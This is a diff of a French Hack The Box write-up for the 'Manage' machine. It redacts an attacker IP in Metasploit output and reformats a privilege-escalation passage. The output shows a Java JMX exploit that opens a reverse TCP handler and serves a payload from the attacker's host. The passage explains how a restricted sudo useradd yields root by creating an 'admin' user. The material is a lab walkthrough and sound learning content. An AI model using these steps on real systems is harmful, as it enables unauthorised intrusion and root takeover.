@@ -564,9 +564,9 @@ RHOST => manage.htb
 msf exploit(multi/misc/java_jmx_server) > set RPORT 2222
 RPORT => 2222
 msf exploit(multi/misc/java_jmx_server) > set LHOST tun0
-LHOST => 10.10.14.152
+LHOST => 10.10.x.x
 msf exploit(multi/misc/java_jmx_server) > exploit
-[*] Started reverse TCP handler on 10.10.14.152:4444 
+[*] Started reverse TCP handler on 10.10.x.x:4444 
 [*] 10.129.234.57:2222 - Using URL: http://10.10.14.152:8080/yedsBc
 [*] 10.129.234.57:2222 - Sending RMI Header...
 [*] 10.129.234.57:2222 - Discovering the JMXRMI endpoint...
@@ -850,7 +850,7 @@ User useradmin may run the following commands on manage:
 
   Cette contrainte empêche toute tentative directe d’ajout à un groupe privilégié (comme `sudo` ou `adm`), puisqu’il est impossible de passer des options supplémentaires à la commande.
 
-  ---
+---
 
   En revanche, un détail important entre en jeu :  
   lorsqu’un utilisateur est créé sous Ubuntu, **un groupe du même nom est automatiquement créé**.
@@ -864,15 +864,15 @@ User useradmin may run the following commands on manage:
   
 
   ⚠️ **Important — contexte spécifique à cette machine**
-  
+
   Sur les versions récentes d’Ubuntu, le groupe `admin` n’est généralement **plus** présent dans la configuration sudo par défaut, remplacé par le groupe `sudo`.
-  
+
   **Dans le contexte précis de la machine Manage**, le système est suffisamment ancien (et/ou configuré) pour que le groupe `admin` dispose encore de privilèges sudo, ce qui rend cette élévation possible **ici**, mais **non généralisable** à d’autres environnements.
+
   
-  
-  
-  ---
-  
+
+---
+
   **Résultat :  
   l'utilisateur admin nouvellement créé peut exécuter `sudo -i` et obtenir un shell root immédiatement, sans aucune autre exploitation.**
 
